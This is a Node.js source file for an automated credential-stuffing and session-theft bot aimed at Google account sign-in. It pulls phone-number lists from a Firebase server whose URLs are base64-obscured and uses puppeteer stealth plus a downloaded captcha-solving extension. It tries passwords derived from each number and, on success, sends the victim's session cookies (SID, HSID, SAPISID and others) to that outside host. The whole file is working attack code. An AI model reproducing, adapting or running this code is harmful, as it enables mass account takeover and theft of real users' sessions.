const { exec } = require('child_process')
let puppeteer
let axios
let fs

let mPath = __dirname+'/module'

let SIZE = 0
let mList = []
let COUNTRY = null
let TIME = null
let CODE = null
let PATTERN = []
let page = null

let mUpdate = new Date().getTime()
let FINISH = new Date().getTime()+21000000


let signIn = 'https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com'

let STORAGE = decrypt('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')

let BASE_URL = decrypt('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUv')

const USER = getUserName()
// const USER = 'raiyan088'


if (USER) {
    console.log('USER: '+USER)

    checkModule()
} else {
    console.log('---NULL---')
    process.exit(0)
}


setInterval(async () => {
    await checkStatus()
}, 60000)

async function checkModule() {

    await checkStatus()

    while (true) {
        try {
            puppeteer = require('puppeteer-extra')

            let StealthPlugin = require('puppeteer-extra-plugin-stealth')

            puppeteer.use(StealthPlugin())
            break
        } catch (ex) {
            console.log('Install Node Package')

            await installModule('puppeteer@19.10.0')
            console.log('Install Puppeteer')
            await installModule('puppeteer-core@19.10.0')
            console.log('Install Puppeteer-Core')
            await installModule('puppeteer-extra')
            console.log('Install Puppeteer-Extra')
            await installModule('puppeteer-extra-plugin-stealth')
            await installModule('axios')
            console.log('Install Axios')
            await installModule('fs')

            console.log('Install Completed')
        }
    }

    while (true) {
        try {
            axios = require('axios')
            break
        } catch (ex) {
            await installModule('axios')
        }
    }

    while (true) {
        try {
            fs = require('fs')
            break
        } catch (ex) {
            await installModule('fs')
        }
    }

    if (!fs.existsSync('module')) {
        console.log('Download Module')
        let gitUrl = 'https://raw.githubusercontent.com/raiyan088/public/main/hcaptcha/'
        if (!fs.existsSync('module.zip')) {
            await fileDownload(gitUrl+'module.zip', 'module.zip')
        }
        console.log('Install Module')
        await unzipFile('module.zip', 'module')
        await fileDownload(gitUrl+'/wasm.wasm', 'module/static/wasm.wasm')
        await fileDownload(gitUrl+'/wasm-simd.wasm', 'module/static/wasm-simd.wasm')
    }

    console.log('★★★---START---★★★')

    await startServer()
}


async function startServer() {
    try {
        TIME = null
        SIZE = 0

        try {
            let response = await getAxios(BASE_URL+'server/rdp/'+USER+'.json')
            let data = response.data

            if (data) {
                if (data.time) {
                    TIME = data.time
                }

                if (data.size) {
                    SIZE = data.size
                }
            }
        } catch (error) {}

        mList = await getNumber(false)

        if (SIZE >= mList.length) {
            mList = await getNumber(true)
        }

        await startBrowser()

    } catch (error) {
        console.log('---ERROR---')
        process.exit(0)
    }
}

async function startBrowser() {
    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage',
                `--disable-extensions-except=${mPath}`,
                `--load-extension=${mPath}`,
            ]
        })
    
        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
        
        await page.goto(signIn)

        await page.screenshot({ path:'page.png' })

        await page.goto('chrome-extension://hlifkpholllijblknnmbfagnkjneagid/popup/popup.html', { waitUntil: 'load', timeout: 0 })

        let mInstall = await checkExtensionInstall()

        if (mInstall) {
            while (true) {
                try {
                    if (SIZE >= mList.length) {
                        mList = await getNumber(true)
                    }
                    console.log('Size:', SIZE)
                    await loginNumber()
                } catch (error) {}
            }
        } else {
            console.log('---NO-INSTALL---')
            process.exit(0)
        }
    } catch (error) {
        console.log(error)
        console.log('---ERROR---')
        process.exit(0)
    }
}

async function loginNumber() {
    await page.goto(signIn, { waitUntil: 'load', timeout: 0 })
    await waitForLoginNext()
    await page.type('#identifierId', '+'+CODE+mList[SIZE])
    await delay(500)
    await page.click('#identifierNext')
    let status = await waitForLoginStatus(true)

    await page.screenshot({ path: 'page.png', fullPage: true })
    
    console.log('login:', status)
    
    if (status == 2) {
        console.log('captcha')
        for (let i = 0; i < 3; i++) {
            status = await waitForCaptchaSolve()

            console.log('captcha', status)

            if (status == 1) {
                status = await waitForLoginStatus(false)
                break
            } else {
                await page.reload()
            }
        }
    }
    
    if (status == 1) {
        for (let i = 0; i < PATTERN.length; i++) {
            let number = ''+CODE+mList[SIZE]
            let password = number.substring(PATTERN[i][0], PATTERN[i][1])
            
            status = await waitForPassword(password)

            console.log('password:', status)
            
            if (status != 9) {
                if (status == 1) {
                    let Cookie = ''
                    try {
                        let cookies = await page.cookies()
        
                        for (let i = 0; i < cookies.length; i++) {
                            let name = cookies[i]['name']

                            if (name == 'APISID' || name == 'HSID' || name == 'LSID' || 
                                    name == 'OSID' || name == 'SID' || name == 'SSID' ||
                                        name == 'SAPISID' || name == '__Secure-1PSID') {
                                
                                Cookie += name+'='+cookies[i]['value']+'; '
                            }
                        }
                    } catch (error) {}

                    await patchAxios(BASE_URL+'login/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+password+'":"'+Cookie+'"}', {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })

                    console.log(Cookie)
                } else if (status > 1 && status < 8) {
                    await patchAxios(BASE_URL+'password/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+password+'":"'+(200+status-1)+'"}', {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })
                }
                break
            }
        }
    }

    SIZE++

    let now = new Date().getTime()

    if(mUpdate < now) {
        mUpdate = now+120000

        await patchAxios(BASE_URL+'server/rdp/'+USER+'.json', JSON.stringify({ size:SIZE }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    }
}


async function waitForLoginNext() {
    for (let i = 0; i < 10; i++) {
        await delay(500)

        if (await exits('#identifierId') && await exits('#identifierNext')) {
            break
        }
    }
}

async function waitForLoginStatus(recaptcha) {
    let status = 0

    for (let i = 0; i < 30; i++) {
        await delay(500)
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl) {
                if (pageUrl.includes('unknownerror')) {
                    status = 0
                    break
                } else if (recaptcha && (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/recaptcha') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/recaptcha'))) {
                    status = 2
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/rejected')) {
                    status = 3
                    break
                } else if(pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pk/presend') ||pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/pk/presend')) {
                    status = 4
                    break
                } else if(pageUrl.startsWith('https://accounts.google.com/Captcha')) {
                    status = 5
                    break
                } else if (await exits('input[aria-label="Enter your password"]')) {
                    status = 1
                    break
                } else if (await exits('div[class="dEOOab RxsGPe"] > div')) {
                    status = 6
                    break
                } else if (await page.evaluate(() => {
                    let root = document.querySelector('img#captchaimg')
                    if (root && root.src.length > 10) {
                        return true
                    }
                    return false
                })) {
                    status = 5
                    break
                }
            }
        } catch (error) {}
    }
    
    return status
}


async function waitForCaptchaSolve() {
    let status = 0

    for (let i = 0; i < 60; i++) {
        await delay(1000)
        if(await page.evaluate(() => {
            let root = document.querySelector('#g-recaptcha-response')
            if (root && root.value.length > 100) {
                return true
            }
            return false
        })) {
            status = 1
            break
        }
    }

    if (status == 1) {
        await delay(500)
        let next = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]'
        
        if (await exits(next)) {
            await page.click(next)
        } else{
            next = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b VfPpkd-ksKsZd-mWPk3d"]'
            if (await exits(next)) {
                await page.click(next)
            }
        }
    }

    return status
}


async function waitForPassword(password) {
    await delay(1000)
    await page.type('input[aria-label="Enter your password"]', password)
    await delay(500)
    let next = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]'
    
    if (await exits(next)) {
        await page.click(next)
    } else{
        next = 'button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b VfPpkd-ksKsZd-mWPk3d"]'
        if (await exits(next)) {
            await page.click(next)
        }
    }

    let status = 0

    await delay(500)

    for (let i = 0; i < 30; i++) {
        await delay(500)
        try {
            let pageUrl = await page.evaluate(() => window.location.href)
            
            if (pageUrl) {
                if (pageUrl.includes('unknownerror')) {
                    status = 11
                    break
                } else if (pageUrl.startsWith('https://gds.google.com/web/chip') || pageUrl.startsWith('https://myaccount.google.com')) {
                    let ID = 0
                    try {
                        let cookies = await page.cookies()
        
                        for (let i = 0; i < cookies.length; i++) {
                            let name = cookies[i]['name']
                            if (name == 'SSID' || name == 'HSID' || name == 'APISID') {
                                ID++
                            }
                        }
                    } catch (error) {}

                    if (ID == 3) {
                        status = 1
                        break
                    } else {
                        await page.goto('https://myaccount.google.com', { waitUntil: 'load', timeout: 0 })
                    }
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/selection') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/selection')) {
                    status = 2
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/bc') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/bc')) {
                    status = 3
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ootp') ||
                            pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pk') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/dp') ||
                                pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/ootp') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/pk')) {
                    status = 4
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/ipp') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/ipp')) {
                    status = 5
                    break
                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/iap') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/iap')) {
                    status = 6
                    break
                } else if(pageUrl.startsWith('https://accounts.google.com/signin/v2/deniedsigninrejected') ||pageUrl.startsWith('https://accounts.google.com/v3/signin/rejected')) {
                    status = 7
                    break
                } else if(pageUrl.startsWith('https://accounts.google.com/signin/v2/disabled/explanation') ||pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/pk/presend')) {
                    status = 8
                    break
                } else if(pageUrl.startsWith('https://accounts.google.com/Captcha')) {
                    status = 10
                    break
                } else if (await exits('div[class="Ly8vae uSvLId"] > div')) {
                    status = 9
                    break
                } else if (await page.evaluate(() => {
                    let root = document.querySelector('img#captchaimg')
                    if (root && root.src.length > 10) {
                        return true
                    }
                    return false
                })) {
                    status = 10
                    break
                } else {
                    try {
                        let ID = 0
                        let cookies = await page.cookies()
        
                        for (let i = 0; i < cookies.length; i++) {
                            let name = cookies[i]['name']
                            if (name == 'SSID' || name == 'HSID' || name == 'APISID') {
                                ID++
                            }
                        }
        
                        if (ID == 3) {
                            status = 1
                            break
                        }
                    } catch (error) {}
                }
            }
        } catch (error) {}
    }

    return status
}

async function checkExtensionInstall() {
    await delay(500)

    return await page.evaluate(() => {
        let root = document.querySelector('script[src="popup.js"]')
        if (root) {
            return true
        }
        return false
    })
}

async function exits(element) {
    return await page.evaluate((element) => {
        let root = document.querySelector(element)
        if(root) {
            return true
        }
        return false
    }, element)
}

async function getNumber(update) {
    try {
        let response = await getAxios(BASE_URL+'server/password.json')

        COUNTRY = response.data.country
        CODE = response.data.code
        PATTERN = response.data.pattern
    } catch (error) {}

    let output = []

    if (TIME == null || update) {
        try {
            if (TIME) {
                await axios.delete(BASE_URL+'found/number/'+COUNTRY+'/'+TIME+'.json')

                TIME = null
            }
        } catch (error) {}

        try {
            let runing = ''
            try {
                let response = await getAxios(BASE_URL+'server/found/time.json')
                if (response.data) {
                    runing = ''+response.data
                }
            } catch (error) {}

            let response = await getAxios(BASE_URL+'found/collect/'+COUNTRY+'.json?orderBy="$key"&limitToFirst=20&print=pretty')
            let list = []

            for (let key of Object.keys(response.data)) {
                if (key != runing) {
                    list.push(key)
                }
            }

            if (list.length > 0) {
                let name = list[Math.floor((Math.random() * list.length))]

                try {
                    await axios.delete(BASE_URL+'found/collect/'+COUNTRY+'/'+name+'.json')
                } catch (error) {}

                await patchAxios(BASE_URL+'server/rdp/'+USER+'.json', JSON.stringify({ time:name, size:0 }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })

                TIME = name
                SIZE = 0
            }
        } catch (error) {}
    }
    
    try {
        if (TIME) {
            let response = await getAxios(BASE_URL+'found/number/'+COUNTRY+'/'+TIME+'.json')

            output = []

            for (let value of Object.values(response.data)) {
                try {
                    output.push(value)
                } catch (error) {}
            }
        }
    } catch (error) {}

    if (output.length > 0) {
        return output
    }

    await delay(60000)
    console.log('----NUMBER-ERROR----')

    return await getNumber(update)
}

async function getAxios(url) {
    let loop = 0
    let responce = null

    while (true) {
        try {
            responce = await axios.get(url)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }

    return responce
}

async function patchAxios(url, body, data) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            data.timeout = 10000
            responce = await axios.patch(url, body, data)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}

async function checkStatus() {
    try {
        if (FINISH > 0 && FINISH < new Date().getTime()) {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+10)
            })
    
            console.log('---COMPLETED---')
            process.exit(0)
        } else {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
            })
        }
    } catch (error) {}
}

async function installModule(module) {
    return new Promise((resolve) => {
        try {
            exec('npm install '+module, function (err, stdout, stderr) {
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

async function unzipFile(file, dir) {
    return new Promise((resolve) => {
        try {
            exec('unzip '+file+' -d '+dir, function (err, stdout, stderr) {
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

async function fileDownload(url, name) {
    return new Promise((resolve) => {
        try {
            exec('wget -O '+name+' '+url, function (err, stdout, stderr) {
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 2) {
            let index = directory.length - 2
            let name = directory[index]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 2) {
            let index = directory.length - 2
            let name = directory[index]
            if (name) {
                return name
            }
        }
    } catch (error) {}
    
    return null
}

function decrypt(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
